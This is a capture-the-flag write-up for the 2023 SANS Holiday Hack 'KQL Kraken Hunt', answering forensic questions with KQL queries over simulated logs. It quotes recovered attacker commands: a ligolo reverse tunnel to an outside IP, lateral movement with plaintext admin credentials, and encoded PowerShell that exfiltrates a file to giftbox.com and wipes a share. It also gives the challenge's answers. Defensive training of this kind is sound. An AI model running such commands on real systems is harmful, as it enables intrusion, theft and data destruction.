# Writeup for The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey \| Featuring 6: Geese A-Lei'ing!
## KQL Kraken Hunt
Difficulty: :christmas_tree::christmas_tree:  
Use Azure Data Explorer to [uncover misdeeds](https://detective.kusto.io/sans2023) in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.

### Hints
#### Outbound Connections
*From: Tangle Coalbox*
Do you need to find something that happened via a process? Pay attention to the ProcessEvents table!
#### KQL Tutorial
*From: Tangle Coalbox*
Once you get into the [Kusto trainer](https://detective.kusto.io/sans2023), click the blue Train me for the case button to get familiar with KQL.
#### File Creation
*From: Tangle Coalbox*
Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.

### Solution
#### Onboarding
*Question*: How many Craftperson Elf's are working from laptops? 

*Query*:
```kql
Employees 
| where role == "Craftsperson Elf" and hostname contains "LAPTOP"
| summarize count()
```

*Answer*: `25`

#### Case #1
*Question*: 
1) What is the email address of the employee who received this phishing email?
2) What is the email address that was used to send this spear phishing email?
3) What was the subject line used in the spear phishing email?

*Query*:
```kql
Email
| where link contains "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
| project recipient, sender, subject
```

*Answer*: 
| recipient | sender | subject |
| ------------------------------------------------ | ------------------ | -------------------------------- |
| alabaster_snowball@santaworkshopgeeseislands.org | cwombley@gmail.com | \[EXTERNAL\] Invoice foir reindeer food past due |

#### Case #2
*Question*: 
1) What is the role of our victim in the organization?
2) What is the hostname of the victim's machine?
3) What is the source IP linked to the victim?

*Query*:
```kql
Employees
| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
| project role, hostname, ip_addr
```

*Answer*: 
| role     | hostname     | ip_addr   | 
| -------- | ------------ | --------- |
| Head Elf | Y1US-DESKTOP | 10.10.0.4 |

#### Case #3
*Question*: 
1) What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!
2) What file is dropped to Alabaster's machine shortly after he downloads the malicious file?

*Query for question 1*:
```kql
OutboundNetworkEvents
| where src_ip == "10.10.0.4" and url contains "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
| project timestamp
```

*Answer to question 1*: `2023-12-02T10:12:42Z`

*Query for question 2*:
```kql
FileCreationEvents
| where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z") and filename != "MonthlyInvoiceForReindeerFood.docx"
| limit 1
| project filename
```

*Answer to question 2*: `giftwrap.exe`

#### Case #4
*Question*: 
1) The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?
2) What is the timestamp when the attackers enumerated network shares on the machine?
3) What was the hostname of the system the attacker moved laterally to?

*Query*:
```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z")
```

*Answer to question 1*:   
This took a little manual analysis, eventually identifying the command:
```cmd
cmd.exe "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
```

*Answer to question 2*:  
This took a little manual analysis, eventually identifying a `net share` command at `2023-12-02T16:51:44Z`

*Answer to question 3*:  
This took a little manual analysis, eventually identifying the command:
```cmd
cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
```

#### Case #5
*Question*:  
1) When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?
2) What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)
3) The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?

*Query*:  
```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z")
```

*Answer to question 1*:  
This took a little manual analysis, and a much welcome message on Discors from @fauxkassarole *“Since I've answered it in DMs several times now for Q5 The first encrypted powershell timestamp is referring to the first malicious command not just the first time an encrypted powershell command is run”*, I eventually identified the command 
```cmd
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
``` 
at `2023-12-24T16:07:47Z`.

*Answer to question 2*:
By decoding the base64 powershell in the previous command we can obtain:
```cmd
( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''
```
Then reversing it:
```cmd
'powershell.exe -c Copy-Item \\NorthPolefileshare\\c$\\MissionCritical\\NaughtyNiceList.txt C:\\Desktop\\NaughtyNiceList.txt'
```
So the attacker is after the file `NaughtyNiceList.txt`.

*Answer to question 3*:  
Another powershell with base64 encoded payload is:
```cmd
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=
```
Once decoded:
```cmd
[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110,119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*MDr*').NamE[3,11,2]-joiN
```
By substituting with ASCII characters we obtain:
```cmd
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
```
So the domain is `giftbox.com`.

#### Case #6
*Question*:  
1) What is the name of the executable the attackers used in the final malicious command?
2) What was the command line flag used alongside this executable?  

*Query*:  
```kql
ProcessEvents
| where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z")
```

*Answer*:  
This took a little manual analysis, eventually identifying the command:
```cmd
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=
```
By decoding the base64 payload:
```cmd
C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
```
So the executable is `downwithsanta.exe` and the command line flag is `--wipeall`.

#### Flag
Use KQL to obtain the flag:
```kql
print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')
```

*Answer*: `Beware the Cube that Wombles`